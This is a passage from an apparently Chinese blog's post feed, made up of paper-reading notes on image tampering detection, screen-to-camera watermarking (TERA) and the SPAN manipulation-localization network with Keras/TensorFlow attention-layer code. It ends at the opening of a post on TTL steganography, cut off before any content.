不是一个二值化的分类mask图像，而是在0-255之间的灰度图像。</p><p>无论是边缘还是区域，人眼都是可以看出篡改面积的大小的。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/036877c9d7284688890ec3c5c45337c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7fb4c9d776a74f13a190448f84710912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h1 id="前半部分网络"><a href="#前半部分网络" class="headerlink" title="前半部分网络"></a>前半部分网络</h1><p>专注于融合多尺度的特征</p><p>自上而下输出的特征图变为上层的1&#x2F;2.</p><p>所有的block 全部为stage1标注的相同。</p><h1 id="后半部分网络"><a href="#后半部分网络" class="headerlink" title="后半部分网络"></a>后半部分网络</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dabea753e5d34b55bd0e3569b987b9b3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 提供最终的结果，<strong>由粗到细的思想</strong>。</p><p>分辨率较小的输出提供精确度较小的预测图。</p><p>所有的输出pred ，全部由<strong>gt经过resize</strong>之后使用<strong>交叉熵loss</strong>进行约束。</p><p>同时得到了像素级的Pred和图像整体的篡改概率。</p><blockquote></blockquote><p>图像整体的概率由0&#x2F;1标注。经过篡改为1，未经过篡改为0。<br> 同样由交叉熵loss约束。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1e69d9589996403ebc6df7b6a6ec4836.png"><br> mask由<br> 下层的mask 经过上采样到与上层特征相同，在与上层特征做点乘作为SCCM的输入。SCCM不改变图像的大小。得到新的mask ，为SCCM 的输出。</p><blockquote></blockquote><p>这是把前一个mask 当作是后一个mask的先验。</p><h2 id="最终的loss函数"><a href="#最终的loss函数" class="headerlink" title="最终的loss函数"></a>最终的loss函数</h2><p>很容易理解就是5个交叉熵loss。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ee8bf3b7846f467ebf2613ee393abd2b.png"></p><h1 id="SCCM"><a href="#SCCM" class="headerlink" title="SCCM"></a>SCCM</h1><h1 id="得到全图的篡改概率"><a href="#得到全图的篡改概率" class="headerlink" title="得到全图的篡改概率"></a>得到全图的篡改概率</h1><blockquote></blockquote><p>Jingdong Wang, Ke Sun, Tianheng Cheng, Borui Jiang, Chaorui Deng, Yang<br> Zhao, Dong Liu, Yadong Mu, Mingkui Tan, Xinggang Wang, et al. Deep<br> high-resolution representation learning for visual recognition. PAMI,<br> 2020. 2, 3,<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a728fb40da194af0a7186265a15bf75e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> Detection Head 的输入为4个特征。Detection Head的构造由上引用论文给出，。</p><p>用4个特征给出一个概率也不是什么难事。就不去找这篇论文了。</p><h1 id="训练方式"><a href="#训练方式" class="headerlink" title="训练方式"></a>训练方式</h1><p>MS COCO生成训练数据</p><p>每个类有100k的∼图像，因此总共有400k。由于在一个epoch内训练所有篡改图像的效率低下，在每个类中均匀采样25k张图像，形成一个100k张动态数据集，在每个epoch内进行训练。此外，还构建了一个包含4张×100张图像的验证集。合成图像的大小均设置为256×256。</p><h1 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/09abfb2aed5d4150a763def7dd64653b.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/93468131be0f46b1a9306e54822e0359.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b7b2d6ca096f4bc38bd5b37ce7fb5173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ed730857d1d44f19a526cda5257adca8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TERA- Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability论文阅读</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20TERA-%20Screen-to-Camera%20Image%20Code%20with%20Transparency,%20Efficiency,%20Robustness%20and%20Adaptability%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20TERA-%20Screen-to-Camera%20Image%20Code%20with%20Transparency,%20Efficiency,%20Robustness%20and%20Adaptability%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability论文阅读</p><h1 id="TERA-Screen-to-Camera-Image-Code-with-Transparency-Efficiency-Robustness-and-Adaptability论文阅读"><a href="#TERA-Screen-to-Camera-Image-Code-with-Transparency-Efficiency-Robustness-and-Adaptability论文阅读" class="headerlink" title="TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability论文阅读"></a>TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability论文阅读</h1><blockquote></blockquote><p>作者单位中科院</p><p>文章仅供自学</p><h1 id="研究主题"><a href="#研究主题" class="headerlink" title="研究主题"></a>研究主题</h1><p>可以应对 Screen-to-Camera的水印，且满足<strong>四个要求：高透明度，高嵌入效率，传输鲁棒性强，对设备类型的适应性强</strong><br> 这四个指标作为重点。这篇文章的主要归类为时域水印，高透明度水印。</p><h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>人眼视觉和机器视觉存在偏差，主要在于人眼的视觉残留现象，会将screen中刷新率大于60Hz的连续图像进行融合。</p><h2 id="消息编码法"><a href="#消息编码法" class="headerlink" title="消息编码法"></a>消息编码法</h2><p>消息编码实际上没有一个定论，说哪一种表现形式更好。重复编码块，实现鲁棒性，防止消息受到不可复原的破坏。就是l长度的消息+CRC校验码，最后补0到a*a长度。只要最终的消息M1,M2,M3,M4完整，即可完成提取。理论上可以损失3&#x2F;4的消息。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6ef388c0521e46949655b087110916a0.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/10f7cc1d498340a9acc4521bbd048219.png"></p><h2 id="嵌入模块"><a href="#嵌入模块" class="headerlink" title="嵌入模块"></a>嵌入模块</h2><p>根据应用场景，使用图像处理分解为I+和I-两个图像进行编码，再通过注意力引导网络进行解码，本质上属于高透明度的水印方法，和原图进行加权相加方式加入水印<br> <img alt="I+和I-" src="https://img-blog.csdnimg.cn/2e67ad6bfbeb470fa25beb43ba87b01c.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/758b7e978aee41d3be3974571ed61317.png"></p><p>嵌入公式如下，其本质在于公式5，这是一个透明度水印；而其核心思路（人眼的融合策略）体现在公式3，加权和显然是原图<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ec532f0142284c0382dadc988c01d333.png"><br> 上面的几个公式就说明了以下事实：</p><h2 id="扰动模块"><a href="#扰动模块" class="headerlink" title="扰动模块"></a>扰动模块</h2><p>文章里面说是那照相机捕获相机中的图像，我觉得不大行，主要是贵。<br> 文章中也提到 2019年这篇文章实现了screen-camera的模拟，这种模拟至少在那篇论文中是可行的，但是Strgstamp这篇论文的screen-camera步骤感觉奇奇怪怪的，特别是detect步骤。</p><blockquote></blockquote><p>stegstamp(cvpr 2019):模仿了照相机-屏幕的转换</p><h2 id="提取模块"><a href="#提取模块" class="headerlink" title="提取模块"></a>提取模块</h2><p>提取方式为3阶段网络：<strong>强化-注意力-回归子网</strong>，施加不同loss;以及对抗子网对强化网络的图像质量进行约束（patch-gan）进行判别。<br> 这个提取模块还挺复杂的。主要是通过增强和注意力机制来缓解screen-camera的信息损失。Loss就不写了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0e02793d119840beb61aa73011748d0a.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9cbe1c8ee95848bb994f81565618f1c9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPAN- Spatial Pyramid Attention Network for Image Manipulation Localization</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20SPAN-%20Spatial%20Pyramid%20Attention%20Network%20for%20Image%20Manipulation%20Localization/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20SPAN-%20Spatial%20Pyramid%20Attention%20Network%20for%20Image%20Manipulation%20Localization/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  SPAN: Spatial Pyramid Attention Network for Image Manipulation Localization</p><h1 id="SPAN-Spatial-Pyramid-Attention-Network-for-Image-Manipulation-Localization"><a href="#SPAN-Spatial-Pyramid-Attention-Network-for-Image-Manipulation-Localization" class="headerlink" title="SPAN: Spatial Pyramid Attention Network for Image Manipulation Localization"></a>SPAN: Spatial Pyramid Attention Network for Image Manipulation Localization</h1><blockquote></blockquote><p>SPAN: Spatial Pyramid Attention Network for Image Manipulation<br> Localization</p><p>ECCV 2020</p><h1 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h1><p><a href="https://github.com/ZhiHanZ/IRIS0-SPAN/blob/d8e4241f151ef2f40eacbb970fe5e3f531c6a4b4/README.md">https://github.com/ZhiHanZ/IRIS0-SPAN/blob/d8e4241f151ef2f40eacbb970fe5e3f531c6a4b4/README.md</a></p><p>不过这个作者提供的权重是多gpu的，准确来说是2个GPU，没有这个资源用他这个训练好的模型。受不了。这个作者也是不厚道。使用的tensorflow的框架。<br> 这个代码整了两天没跑起来。生气</p><hr><p><strong>这个作者的不厚道有2点</strong></p><hr><h1 id="网络框架"><a href="#网络框架" class="headerlink" title="网络框架"></a>网络框架</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8c3acb2211ea44c6ac2038cf450c2a83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br> 这个 <strong>pre-trained feature extracion</strong> 使用的是mantra net 的预训练模型，训练时候冻结。</p><p>后接5个self attention block.</p><p>这个self attention有些玄妙。</p><h1 id="self-attention-block"><a href="#self-attention-block" class="headerlink" title="self attention block"></a>self attention block</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b5cdf3f7d94b4693b129d035074ea7a8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br> 不知道有没有理解错。<br> 只需要理解成特殊的卷积层即可。<br> 输入输出的矩阵大小没有变化。</p><p>中间层把D通道转为了9D通道（假设了n&#x3D;1,为8邻域。）<br> 9D为自身以及周围的8个点。为原本的通道数*9.</p><blockquote></blockquote><p><strong>这个玄妙的地方大概在于</strong> 能够把一个像素点为中心的周围(2n+1)*(2n+1)邻域之内的所有像素的信息全部接收到一个对应点。</p><p>本来这东西是NLP领域提出的，不使用RNN，就得到时间顺序信息。图像和语言还是有些差别的。语言中的语言顺序和图像的邻域或许是等价的吧。</p><h2 id="这是抄的这个作者的tensorflow-代码"><a href="#这是抄的这个作者的tensorflow-代码" class="headerlink" title="这是抄的这个作者的tensorflow 代码"></a>这是抄的这个作者的tensorflow 代码</h2><p>基本和此图的结果相同，可能卷积层的数量稍微有点出入。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9179242b89cd468f9c01a67054ae33a8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h3 id="self-attention-代码"><a href="#self-attention-代码" class="headerlink" title="self attention 代码"></a>self attention 代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">from keras.engine.topology import Layer</span><br><span class="line">import tensorflow as tf</span><br><span class="line">import keras</span><br><span class="line">from matplotlib.image import imread, imsave</span><br><span class="line">from keras import backend as K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class PixelAttention(Layer):</span><br><span class="line">    def __init__(self, kernel_range=[3, 3], shift=1, ff_kernel=[3, 3], useBN=False, useRes=False, **kwargs):</span><br><span class="line">        self.kernel_range = kernel_range  # should be a list</span><br><span class="line">        self.shift = shift</span><br><span class="line">        self.ff_kernel = ff_kernel</span><br><span class="line">        self.useBN = useBN</span><br><span class="line">        self.useRes = useRes</span><br><span class="line">        super(PixelAttention, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">    def build(self, input_shape):</span><br><span class="line">        D = input_shape[-1]</span><br><span class="line">        n_p = self.kernel_range[0] * self.kernel_range[1]</span><br><span class="line">        self.K_P = self.add_weight(name=&#x27;K_P&#x27;, shape=(1, 1, D, D * n_p),</span><br><span class="line">                                   initializer=&#x27;glorot_uniform&#x27;,</span><br><span class="line">                                   trainable=True)</span><br><span class="line">        self.V_P = self.add_weight(name=&#x27;V_P&#x27;, shape=(1, 1, D, D * n_p),</span><br><span class="line">                                   initializer=&#x27;glorot_uniform&#x27;,</span><br><span class="line">                                   trainable=True)</span><br><span class="line">        self.Q_P = self.add_weight(name=&#x27;Q_P&#x27;, shape=(1, 1, D, D),</span><br><span class="line">                                   initializer=&#x27;glorot_uniform&#x27;,</span><br><span class="line">                                   trainable=True)</span><br><span class="line"></span><br><span class="line">        self.ff1_kernel = self.add_weight(name=&#x27;ff1_kernel&#x27;,</span><br><span class="line">                                          shape=(3, 3, D, D),</span><br><span class="line">                                          initializer=&#x27;glorot_uniform&#x27;, trainable=True)</span><br><span class="line">        self.ff1_bais = self.add_weight(name=&#x27;ff1_bias&#x27;,</span><br><span class="line">                                        shape=(D,), initializer=&#x27;glorot_uniform&#x27;, trainable=True)</span><br><span class="line">        self.ff2_kernel = self.add_weight(name=&#x27;ff2_kernel&#x27;,</span><br><span class="line">                                          shape=(3, 3, D, 2 * D),</span><br><span class="line">                                          initializer=&#x27;glorot_uniform&#x27;, trainable=True)</span><br><span class="line">        self.ff2_bais = self.add_weight(name=&#x27;ff2_bias&#x27;,</span><br><span class="line">                                        shape=(2 * D,), initializer=&#x27;glorot_uniform&#x27;, trainable=True)</span><br><span class="line"></span><br><span class="line">        self.ff3_kernel = self.add_weight(name=&#x27;ff3_kernel&#x27;,</span><br><span class="line">                                          shape=(3, 3, 2 * D, D),</span><br><span class="line">                                          initializer=&#x27;glorot_uniform&#x27;, trainable=True)</span><br><span class="line">        self.ff3_bais = self.add_weight(name=&#x27;ff3_bias&#x27;,</span><br><span class="line">                                        shape=(D,), initializer=&#x27;glorot_uniform&#x27;, trainable=True)</span><br><span class="line"></span><br><span class="line">        super(PixelAttention, self).build(input_shape)</span><br><span class="line"></span><br><span class="line">    def call(self, x):</span><br><span class="line">        h_half = self.kernel_range[0] // 2</span><br><span class="line">        w_half = self.kernel_range[1] // 2</span><br><span class="line">        _, _, _, D = x.shape</span><br><span class="line">        s = K.shape(x)</span><br><span class="line">        x_k = tf.nn.conv2d(input=x, filter=self.K_P, padding=&quot;SAME&quot;, strides=[1, 1, 1, 1])</span><br><span class="line">        x_v = tf.nn.conv2d(input=x, filter=self.V_P, padding=&quot;SAME&quot;, strides=[1, 1, 1, 1])</span><br><span class="line">        x_q = tf.nn.conv2d(input=x, filter=self.Q_P, padding=&quot;SAME&quot;, strides=[1, 1, 1, 1])</span><br><span class="line">        paddings = tf.constant(</span><br><span class="line">            [[0, 0], [h_half * self.shift, h_half * self.shift], [w_half * self.shift, w_half * self.shift], [0, 0]])</span><br><span class="line">        x_k = tf.pad(x_k, paddings, &quot;CONSTANT&quot;)</span><br><span class="line">        x_v = tf.pad(x_v, paddings, &quot;CONSTANT&quot;)</span><br><span class="line">        mask_x = tf.ones(shape=(s[0], s[1], s[2], 1))</span><br><span class="line">        mask_pad = tf.pad(mask_x, paddings, &quot;CONSTANT&quot;)</span><br><span class="line"></span><br><span class="line">        k_ls = list()</span><br><span class="line">        v_ls = list()</span><br><span class="line">        masks = list()</span><br><span class="line"></span><br><span class="line">        c_x, c_y = h_half * self.shift, w_half * self.shift</span><br><span class="line">        layer = 0</span><br><span class="line">        for i in range(-h_half, h_half + 1):</span><br><span class="line">            # 每一个点的 8邻域 的8个点   根据w_half 决定邻域大小  共  （2n+1)^2  大小的块   每隔像素的邻域点  分到不同的通道中  最后 达到了  h*w *c*(2n+1)^2大小</span><br><span class="line">            # 对于每个点  都是  （（2n+1）^2   *d,1） -&amp;gt;1的一个映射    每个特定位置中所有通道的所有邻域 到  单个点</span><br><span class="line">            for j in range(-w_half, w_half + 1):</span><br><span class="line">                k_t = x_k[:, c_x + i * self.shift:c_x + i * self.shift + s[1],</span><br><span class="line">                      c_y + j * self.shift:c_y + j * self.shift + s[2], layer * D:(layer + 1) * D]</span><br><span class="line">                k_ls.append(k_t)</span><br><span class="line"></span><br><span class="line">                v_t = x_v[:, c_x + i * self.shift:c_x + i * self.shift + s[1],</span><br><span class="line">                      c_y + j * self.shift:c_y + j * self.shift + s[2], layer * D:(layer + 1) * D]</span><br><span class="line">                v_ls.append(v_t)</span><br><span class="line"></span><br><span class="line">                _m = mask_pad[:, c_x + i * self.shift:c_x + i * self.shift + s[1],</span><br><span class="line">                     c_y + j * self.shift:c_y + j * self.shift + s[2], :]</span><br><span class="line">                masks.append(_m)</span><br><span class="line">                layer += 1</span><br><span class="line">        m_stack = tf.stack(masks, axis=3, name=&quot;mask&quot;)</span><br><span class="line">        m_vec = tf.reshape(m_stack, shape=[s[0] * s[1] * s[2], self.kernel_range[0] * self.kernel_range[1], 1])</span><br><span class="line">        k_stack = tf.stack(k_ls, axis=3, name=&quot;k_stack&quot;)</span><br><span class="line">        v_stack = tf.stack(v_ls, axis=3, name=&quot;v_stack&quot;)</span><br><span class="line">        k = tf.reshape(k_stack, shape=[s[0] * s[1] * s[2], self.kernel_range[0] * self.kernel_range[1], D])</span><br><span class="line">        v = tf.reshape(v_stack, shape=[s[0] * s[1] * s[2], self.kernel_range[0] * self.kernel_range[1], D])</span><br><span class="line">        q = tf.reshape(x_q, shape=[s[0] * s[1] * s[2], 1, D])</span><br><span class="line"></span><br><span class="line">        alpha = tf.nn.softmax(tf.matmul(k, q, transpose_b=True) * m_vec / 8, axis=1)  # s[0]*s[1]*s[2]*9  #softmax</span><br><span class="line">        __res = tf.matmul(alpha, v, transpose_a=True)  # a*v</span><br><span class="line">        _res = tf.reshape(__res, shape=[s[0], s[1], s[2], D])</span><br><span class="line">        if self.useRes:</span><br><span class="line">            t = x + _res</span><br><span class="line">        else:</span><br><span class="line">            t = _res</span><br><span class="line">        if self.useBN:</span><br><span class="line">            t = keras.layers.BatchNormalization(axis=-1)(t)</span><br><span class="line">        _t = t</span><br><span class="line">        t = tf.nn.relu(</span><br><span class="line">            tf.nn.conv2d(input=t, filter=self.ff1_kernel, padding=&#x27;SAME&#x27;, strides=[1, 1, 1, 1]) + self.ff1_bais)</span><br><span class="line">        t = tf.nn.relu(</span><br><span class="line">            tf.nn.conv2d(input=t, filter=self.ff2_kernel, padding=&#x27;SAME&#x27;, strides=[1, 1, 1, 1]) + self.ff2_bais)</span><br><span class="line">        t = tf.nn.relu(</span><br><span class="line">            tf.nn.conv2d(input=t, filter=self.ff3_kernel, padding=&#x27;SAME&#x27;, strides=[1, 1, 1, 1]) + self.ff3_bais)</span><br><span class="line">        if self.useRes:</span><br><span class="line">            t = _t + t</span><br><span class="line">        if self.useBN:</span><br><span class="line">            res = keras.layers.BatchNormalization(axis=-1)(t)</span><br><span class="line">        else:</span><br><span class="line">            res = t</span><br><span class="line">        # self attention 层之后的特征图和  输入图像的大小和通道数 相同</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def compute_output_shape(self, input_shape):</span><br><span class="line">        return input_shape</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="主体代码-从此处可以看出信息流"><a href="#主体代码-从此处可以看出信息流" class="headerlink" title="主体代码 从此处可以看出信息流"></a>主体代码 从此处可以看出信息流</h3><p>虽然不熟tensorflow，但是基本看得懂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def get_model_1010_resize(self,layers_steps=[1,3,9,27,81]):</span><br><span class="line">        # todo  把这个函数改为pytorch model</span><br><span class="line">        # get_model_1010_resize   实际使用的model   使用自注意力机制</span><br><span class="line">        img_in = Input(shape=(None,None,3), name=&#x27;img_in&#x27;)</span><br><span class="line">        Featex=self.get_Featex()</span><br><span class="line">        rf=Featex(img_in)</span><br><span class="line">        resize = Lambda( lambda t : tf.image.resize(t, (224, 224)), name=&#x27;resize&#x27;)( rf )</span><br><span class="line">        rf = Conv2D( 32, (1,1), activation=None, use_bias=False, kernel_constraint = unit_norm( axis=-2 ),</span><br><span class="line">                 name=&#x27;outlierTrans_new&#x27;, padding = &#x27;same&#x27; )(resize)</span><br><span class="line">        t=rf</span><br><span class="line">        for step in layers_steps:</span><br><span class="line">            # 循环5次</span><br><span class="line">            t=pa.PixelAttention(shift=step,useBN=False, useRes=True)(t)</span><br><span class="line">            </span><br><span class="line">        pred_out=self.Last_Layer_0725(t)</span><br><span class="line">        model=Model( inputs=img_in, outputs=pred_out, name=&#x27;sigNet&#x27;)</span><br><span class="line">        model.load_weights(self.weight_file,by_name=True)</span><br><span class="line">        return model</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Last-Layer-0725"><a href="#Last-Layer-0725" class="headerlink" title="Last_Layer_0725"></a>Last_Layer_0725</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Last_Layer_0725</span><br><span class="line">def Last_Layer_0725(self,x):</span><br><span class="line">        t=Conv2D( 32, (5,5), activation=&#x27;relu&#x27;, name=&#x27;final_1&#x27;, padding = &#x27;same&#x27; )(x)</span><br><span class="line">        t=Conv2D( 16, (5,5), activation=&#x27;relu&#x27;, name=&#x27;final_2&#x27;, padding = &#x27;same&#x27; )(t)</span><br><span class="line">        t=Conv2D( 8, (5,5), activation=&#x27;relu&#x27;, name=&#x27;final_3&#x27;, padding = &#x27;same&#x27; )(t)</span><br><span class="line">        t=Conv2D( 4, (5,5), activation=&#x27;relu&#x27;, name=&#x27;final_4&#x27;, padding = &#x27;same&#x27; )(t)</span><br><span class="line">        t=Conv2D( 1, (5,5), activation=&#x27;sigmoid&#x27;, name=&#x27;final_5&#x27;, padding = &#x27;same&#x27; )(t)</span><br><span class="line">        return t</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="get-Featex"><a href="#get-Featex" class="headerlink" title="get_Featex"></a>get_Featex</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        </span><br><span class="line">def get_Featex(self,trainable=False):</span><br><span class="line">        type_idx = self.IMC_model_idx if self.IMC_model_idx &amp;lt; 4 else 2</span><br><span class="line">        Featex = modelCore.create_featex_vgg16_base(type_idx)</span><br><span class="line">        Featex.trainable=trainable</span><br><span class="line">        return Featex</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TTL隐写</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20TTL%E9%9A%90%E5%86%99/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20TTL%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  TTL隐写</p><h1 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 